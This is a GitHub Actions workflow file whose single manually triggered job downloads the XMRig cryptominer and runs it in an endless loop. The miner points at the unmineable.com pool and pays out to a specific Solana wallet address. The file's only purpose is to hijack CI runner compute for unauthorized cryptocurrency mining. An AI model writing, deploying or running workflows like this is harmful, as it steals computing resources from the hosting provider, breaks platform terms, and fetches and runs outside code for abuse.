name: salsolnewcode

on:
  workflow_dispatch:

jobs:
  sal1:
    runs-on: ubuntu-latest
    steps:
      - name: Start 1
        run: |	  
          sudo apt update
          sudo apt install -y wget tar
          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
          cd xmrig-6.22.2
          while true; do
            echo "⛏️ miner${i} running at \$(date)"
          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
            sleep 5
          done
